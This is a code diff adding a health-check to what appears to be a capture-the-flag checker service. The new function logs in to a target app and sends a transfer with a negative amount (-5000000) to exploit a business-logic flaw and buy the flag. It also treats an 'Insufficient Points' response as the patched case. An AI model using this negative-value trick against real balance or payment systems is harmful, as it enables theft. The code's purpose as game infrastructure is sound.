@@ -1,3 +1,4 @@
+import hashlib
 import os
 import requests
 from flask import Flask, request, jsonify
@@ -29,6 +30,65 @@ def inject_flag(target_host, port, flag):
     except requests.exceptions.RequestException as e:
         return f"Error: {e}"
 
+def run_healthcheck(target_host, port, flag):
+    """
+    If the exploit is still unpatched, check the flag is obtainable.
+    """
+    base_url = f"http://{target_host}:{port}"
+    flagHash = hashlib.md5(flag.encode()).hexdigest()[:10]
+
+    session = requests.Session()
+    
+    try:
+        # Sign up
+        r = session.post(f"{base_url}/login", data={
+            "username": flagHash, "password": flagHash, "action": "register"
+        }, timeout=5)
+        if "Account created" not in r.text and r.status_code != 200:
+            return "FAILURE"
+
+        # Login
+        r = session.post(f"{base_url}/login", data={
+            "username": flagHash, "password": flagHash, "action": "login"
+        }, timeout=5)
+        if "Dashboard" not in r.text:
+            return "FAILURE"
+
+    except Exception as e:
+        return False, f"Auth Error: {e}"
+
+    # Test vulnerability
+    try:
+        r = session.post(f"{base_url}/transfer", data={
+            "recipient": "root",
+            "amount": -5000000 
+        }, timeout=5)
+
+        # If the transfer didn't work, double check it works at all
+        if "Successfully transferred" not in r.text:
+            r = session.post(f"{base_url}/transfer", data={
+            "recipient": "root",
+            "amount": 1 
+            }, timeout=5)
+            if "Successfully transferred" not in r.text:
+                return "FAILURE"
+        
+        # Buy the flag
+        r = session.post(f"{base_url}/buy/4", timeout=5)
+        
+        if flag in r.text:
+            return "SUCCESS"
+            
+        # Patched case, user must've fixed the vuln but flag was successfully stored.
+        elif "Insufficient Points" in r.text:
+            return "SUCCESS"
+        else:
+            return "FAILURE"
+
+    except Exception as e:
+        return "FAILURE"
+
+
 @app.route("/inject", methods=["POST"])
 def inject():
     """
@@ -47,6 +107,11 @@ def inject():
     flag = data["flag"]
 
     result = inject_flag(ip, port, flag)
+
+    if result != "SUCCESS":
+        return jsonify({"status": "failure", "message": result})
+
+    result = run_healthcheck(ip, port, flag)
 
     if result == "SUCCESS":
         return jsonify({"status": "success"})
